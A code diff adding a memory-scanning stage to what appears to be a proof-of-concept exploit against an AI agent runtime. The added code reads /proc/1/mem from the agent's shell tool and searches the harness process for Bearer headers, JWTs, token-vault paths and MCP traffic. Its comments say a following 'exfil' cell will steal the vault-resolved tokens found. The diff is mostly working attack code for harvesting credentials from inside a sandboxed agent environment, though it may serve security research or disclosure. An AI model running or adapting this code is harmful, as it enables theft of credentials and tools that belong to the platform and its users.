@@ -183,6 +183,92 @@ def main():
     print('  CONCLUSION: shell tool (uid=0) can open /proc/1/mem (uid=0)')
     print('  for both reading and writing. No ptrace, no capabilities needed.')
 
+    # --- 9. Heap anchor scan ---
+    section('9. WHAT LIVES IN PID 1 HEAP (anchor scan)')
+    print('  Scanning /proc/1/mem for structural anchors...')
+    print('  (This is what the exfil script will extract in the next cell.)')
+    print()
+
+    ANCHORS = [
+        # Harness configuration objects (Pydantic models in memory)
+        (b'HarnessRemoteMcpConfig', 'MCP tool config (Pydantic model)'),
+        (b'HarnessToolType', 'Tool type enum'),
+        (b'HarnessHeaders', 'HTTP headers config'),
+        # MCP protocol traffic residue
+        (b'"method":"initialize"', 'MCP initialize call'),
+        (b'"method":"tools/list"', 'MCP tools/list call'),
+        (b'"method":"tools/call"', 'MCP tools/call invocation'),
+        (b'"protocolVersion":"2024-11-05"', 'MCP protocol version'),
+        # HTTP traffic residue
+        (b'Authorization: Bearer', 'Authorization header (credential!)'),
+        (b'authorization: Bearer', 'Authorization header (lowercase)'),
+        (b'server: uvicorn', 'Uvicorn response header'),
+        (b'HTTP/1.1 200 OK', 'HTTP response status'),
+        # Identity vault artifacts
+        (b'credential-provider/', 'Credential provider ARN'),
+        (b'token-vault/', 'Token vault ARN path'),
+        (b'resolve_header_references', 'Loopy vault-resolution function'),
+        (b'GetWorkloadAccessToken', 'Identity API call name'),
+        (b'workloadIdentity', 'Workload identity reference'),
+        # JWT signatures (credential bytes)
+        (b'eyJraWQiOi', 'JWT with kid header (credential)'),
+        (b'eyJhbGciOi', 'JWT with alg header (credential)'),
+        # Runtime URL
+        (b'bedrock-agentcore.us-east-1.amazonaws.com/runtimes/', 'AgentCore runtime URL'),
+    ]
+
+    # Enumerate writable regions
+    regions = []
+    for line in open('/proc/1/maps').readlines():
+        parts = line.split()
+        if len(parts) < 2:
+            continue
+        perms = parts[1]
+        if 'r' not in perms:
+            continue
+        addr_range = parts[0]
+        try:
+            start_s, end_s = addr_range.split('-')
+            lo, hi = int(start_s, 16), int(end_s, 16)
+            if hi - lo >= 4096 and hi - lo <= 50 * 1024 * 1024:
+                regions.append((lo, hi))
+        except Exception:
+            continue
+
+    found_anchors = {}
+    with open('/proc/1/mem', 'rb') as mem:
+        for lo, hi in regions:
+            try:
+                mem.seek(lo)
+                chunk = mem.read(hi - lo)
+            except (OSError, OverflowError):
+                continue
+            for needle, label in ANCHORS:
+                count = chunk.count(needle)
+                if count > 0:
+                    found_anchors[label] = found_anchors.get(label, 0) + count
+
+    print(f'  {"ANCHOR":<45s} {"HITS":>5s}')
+    print(f'  {"-"*45} {"-----":>5s}')
+    for needle, label in ANCHORS:
+        count = found_anchors.get(label, 0)
+        marker = '  <<<' if count > 0 and 'credential' in label.lower() else ''
+        if count > 0:
+            print(f'  {label:<45s} {count:>5d}{marker}')
+
+    total_credential_hits = sum(
+        found_anchors.get(label, 0)
+        for _, label in ANCHORS
+        if 'credential' in label.lower() or 'JWT' in label or 'Bearer' in label
+    )
+    print()
+    if total_credential_hits > 0:
+        print(f'  >>> {total_credential_hits} credential-shaped artifacts in PID 1 heap.')
+        print('  >>> These are the vault-resolved tokens the next cell exfiltrates.')
+    else:
+        print('  (No credential artifacts found — run Cell 2 first to trigger')
+        print('   a legitimate MCP call that resolves the vault credential.)')
+
     section('DONE')
 
 
